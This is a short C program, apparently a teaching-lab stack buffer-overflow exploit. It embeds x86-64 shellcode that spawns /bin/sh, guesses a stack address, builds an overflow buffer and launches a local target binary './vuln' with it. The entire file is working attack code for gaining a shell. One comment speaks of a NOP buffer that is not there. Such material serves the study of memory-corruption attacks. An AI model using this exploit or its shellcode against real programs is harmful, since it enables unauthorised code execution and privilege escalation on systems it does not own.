#include <stdio.h>
#include <string.h>
#include <unistd.h>
char shellcode[]=
"\x55\x48\x89\xe5\xeb\x45\x5b\x55"
"\x48\x89\xe5\x48\x83\xec\x10\x48"
"\x31\xd2\x48\x89\x5d\xf0\x48\x89"
"\x55\xf8\x48\x8d\x75\xf0\x48\x8b"
"\x7d\xf0\xeb\x14\x48\x31\xc0\xb0"
"\x3b\x0f\x05\x48\x31\xc0\xb0\x3c"
"\x48\x31\xc9\x48\x89\xcf\x0f\x05"
"\x4c\x8b\x3f\x49\xc1\xc7\x08\x45"
"\x30\xff\x49\xc1\xcf\x08\x4c\x89"
"\x3f\xeb\xd9\xe8\xb6\xff\xff\xff"
"\x2f\x62\x69\x6e\x2f\x73\x68\x31"
//Replace the above NOP buffer with your shell code.

unsigned long get_sp(void) {
  __asm__("movq %rsp,%rax");
}

void main(int argc, char *argv[])
{
  int bsize=0, offset=0,i=0,j=0;
  char *buff, *ptr;
  long long *addr,*addr_ptr;
  if (argc == 1)
    {
      printf("\n\nUsage is either attack [buffer_size]\n or attack [buffer_size] [stack_offset]\n");
      exit(0);
    }
  if (argc > 1) bsize = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);
      buff = malloc(bsize);
      addr = get_sp() -offset;
      printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr);
      ptr = buff;
      addr_ptr = (long long *) ptr;

      for (i = 0; i < bsize-8; i+=8)
	*(addr_ptr++) = 0xFFFFFFFFFFFFFFFF;
      *(addr_ptr)=addr;

      for (i = 0; i < strlen(shellcode); i++)
	*(ptr++) = shellcode[i];

      buff[bsize - 1] = (char*)NULL;

      execl("./vuln","./vuln", buff, NULL);
      return;
}
